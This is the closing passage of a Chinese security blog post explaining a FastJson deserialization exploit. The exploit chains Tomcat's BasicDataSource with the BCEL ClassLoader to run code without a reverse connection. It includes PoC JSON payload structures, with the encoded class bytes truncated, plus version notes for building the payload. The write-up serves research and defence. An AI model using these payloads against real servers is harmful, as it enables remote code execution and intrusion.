    <span class="k">if</span><span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span>  <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
      <span class="n">cl</span> <span class="o">=</span> <span class="n">defineClass</span><span class="o">(</span><span class="n">class_name</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span>
      <span class="n">cl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">class_name</span><span class="o">);</span>
     
		<span class="o">....</span>

    <span class="k">return</span> <span class="n">cl</span><span class="o">;</span>
<span class="o">}</span>

<span class="cm">/*
* The name contains the special token $$BCEL$$. Everything before that
* token is consddered to be a package name. You can encode you own
* arguments into the subsequent string. 
* The default implementation interprets the string as a encoded compressed
* Java class, unpacks and decodes it with the Utility.decode() method, and
* parses the resulting byte array and returns the resulting JavaClass object.
*
* @param class_name compressed byte code with "$$BCEL$$" in it
*/</span>
<span class="kd">protected</span> <span class="n">JavaClass</span> <span class="nf">createClass</span><span class="o">(</span><span class="n">String</span> <span class="n">class_name</span><span class="o">)</span> <span class="o">{</span>
    <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p>如果 classname 中包含 <code class="highlighter-rouge">$$BCEL$$</code> ，这个 ClassLoader 则会将<code class="highlighter-rouge">$$BCEL$$</code>后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。</p>

<p>于是我们通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。</p>

<p>BCEL编码和解码的方法：</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>

<span class="o">...</span>

<span class="n">String</span> <span class="n">s</span> <span class="o">=</span>  <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">data</span><span class="o">,</span><span class="kc">true</span><span class="o">);</span>

<span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span>  <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>

<span class="o">...</span>
</code></pre></div></div>

<h3 id="0x051--你知道吗">0x05.1  你知道吗</h3>

<p>再回顾一下PoC</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="s2">"x"</span><span class="p">:{</span><span class="w">
                </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="p">,</span><span class="w">
                </span><span class="s2">"driverClassLoader"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span><span class="w">
                </span><span class="p">},</span><span class="w">
                </span><span class="s2">"driverClassName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$$BCEL$$$l$8b$I$A$..."</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}:</span><span class="w"> </span><span class="s2">"x"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>这里PoC结构上还有一个值得注意的地方在于，</p>

<ol>
  <li>先是将 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 “{}”。</li>
  <li>之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。</li>
</ol>

<p>为什么这么设计呢？</p>

<p>因为为了完成前面说的一整个利用链，我们需要触发 BasicDataSource.getConnection() 方法。</p>

<p>我在 <a href="https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA">FastJson反序列化漏洞利用的三个细节</a> 提到过，FastJson中的 JSON.parse() 会识别并调用目标类的 setter 方法以及某些满足特定条件的 getter 方法，然而 getConnection() 并不符合特定条件，所以正常来说在 FastJson 反序列化的过程中并不会被调用。</p>

<p>原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 、is等方法。</p>

<p>首先，在 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。</p>

<p>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">.</span><span class="na">DefaultJSONParser</span><span class="o">.</span><span class="na">parseObject</span>
<span class="n">DefaultJSONParser</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="mi">436</span>

<span class="k">if</span> <span class="o">(</span><span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">JSONObject</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="s">"null"</span> <span class="o">:</span> <span class="n">key</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
<span class="o">}</span>
</code></pre></div></div>

<p>于是乎就触发了 BasicDataSource.getConnection()。PoC最完整的写法应该是：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.alibaba.fastjson.JSONObject"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"x"</span><span class="p">:{</span><span class="w">
                </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="p">,</span><span class="w">
                </span><span class="s2">"driverClassLoader"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span><span class="w">
                </span><span class="p">},</span><span class="w">
                </span><span class="s2">"driverClassName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$$BCEL$$$l$8b$I$A$..."</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}:</span><span class="w"> </span><span class="s2">"x"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div>

<p>当然，如果目标环境的开发者代码中是调用的是  JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>

<p>所以对于 JSON.parseObject()，直接传入这样的Payload也能触发：</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
        </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"driverClassLoader"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="s2">"@type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="s2">"driverClassName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$$BCEL$$$l$8b......"</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div>

<h3 id="0x052--tips">0x05.2  Tips</h3>

<p>BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。</p>

<p>比如：6.0.53、7.0.81等版本。MVN 依赖写法如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --&gt;</span>
<span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>dbcp<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>6.0.53<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</code></pre></div></div>

<p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。
MVN依赖写法如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --&gt;</span>
<span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>tomcat-dbcp<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>9.0.8<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</code></pre></div></div>


      <footer class="entry-meta">
        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
        <span class="entry-tags"><a href="https://kingx.me/tags/#Java" title="Pages tagged Java" class="tag"><span class="term">Java</span></a><a href="https://kingx.me/tags/#ClassLoader" title="Pages tagged ClassLoader" class="tag"><span class="term">ClassLoader</span></a><a href="https://kingx.me/tags/#FastJson" title="Pages tagged FastJson" class="tag"><span class="term">FastJson</span></a></span>
        
        <div class="social-share">
  <ul class="socialcount socialcount-small inline-list">
    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《Java动态类加载，当FastJson遇到内网》&url=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
  </ul>
</div><!-- /.social-share -->
<!--
<div class="ds-share" data-thread-key="/Exploit-FastJson-Without-Reverse-Connect" data-title="Java动态类加载，当FastJson遇到内网" data-images="" data-content="Java动态类加载，当FastJson遇到内网" data-url="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">
    <div class="ds-share-inline">
      <ul  class="ds-share-icons-16">
        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
      </ul>
      <div class="ds-share-icons-more">
      </div>
    </div>
</div>
-->
      </footer>
    </div><!-- /.entry-content -->
    
    

    <div class="read-more">
  
    <div class="read-more-header">
      
        <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" class="read-more-btn">Read More</a>
      
    </div><!-- /.read-more-header -->
    <div class="read-more-content">
      
      <h3><a href="https://kingx.me/Patch-log4j.html" title="Log4j 严重漏洞修复方案参考 CVE-2021-44228">Log4j 严重漏洞修复方案参考 CVE-2021-44228</a></h3>
      <p>CVE-2021-44228 <a href="https://kingx.me/Patch-log4j.html">Continue reading</a></p>
      
    </div><!-- /.read-more-content -->
  
  <div class="read-more-list">
    
      
      <div class="list-item">
        <h4><a href="https://kingx.me/Thinking-about-the-RedTeam-Engagement.html" title="浅谈大规模红蓝对抗攻与防">浅谈大规模红蓝对抗攻与防</a></h4>
        <span>Published on October 12, 2020</span>
      </div><!-- /.list-item -->
      
    
      
      <div class="list-item">
        <h4><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h4>
        <span>Published on June 03, 2019</span>
      </div><!-- /.list-item -->
      
    
  </div><!-- /.read-more-list -->
</div><!-- /.read-more -->
  </article>
</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2022 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://kingx.me/assets/js/scripts.min.js"></script>




<script>

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  if(location.host=="kingx.me"){
    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
  }else if(location.host=="kingx.sinaapp.com"){
    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
  }
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Busuanzi Analytics -->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



	        

</body>
</html>
